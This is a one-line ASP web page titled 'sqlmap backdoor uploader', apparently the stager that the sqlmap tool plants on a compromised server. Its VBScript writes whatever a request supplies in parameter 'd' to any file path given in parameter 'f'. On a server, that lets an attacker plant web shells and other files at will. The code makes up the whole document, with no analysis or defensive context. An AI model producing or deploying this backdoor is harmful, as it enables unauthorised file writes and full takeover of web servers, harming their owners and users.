<p><b>sqlmap backdoor uploader</b></p>
<%set f = server.createobject("Scripting.FileSystemObject"):set o=f.OpenTextFile(Request("f"), 2, True):o.Write Request("d"):o.Close:set o=Nothing:set f=Nothing%>
